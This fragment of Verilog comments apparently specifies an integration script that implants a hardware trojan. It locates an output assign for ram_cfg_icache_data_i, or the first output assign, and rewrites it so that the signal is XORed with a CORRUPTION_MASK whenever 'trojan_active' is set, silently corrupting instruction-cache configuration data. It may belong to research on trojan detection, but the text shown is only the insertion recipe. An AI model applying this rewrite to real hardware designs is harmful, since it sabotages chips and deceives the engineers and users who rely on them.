...
//
// IMPORTANT: ram_cfg_icache_data_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If ram_cfg_icache_data_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for ram_cfg_icache_data_i (or first output assign):
//     assign ram_cfg_icache_data_i = <expr>;
//   Replace with:
//     assign ram_cfg_icache_data_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
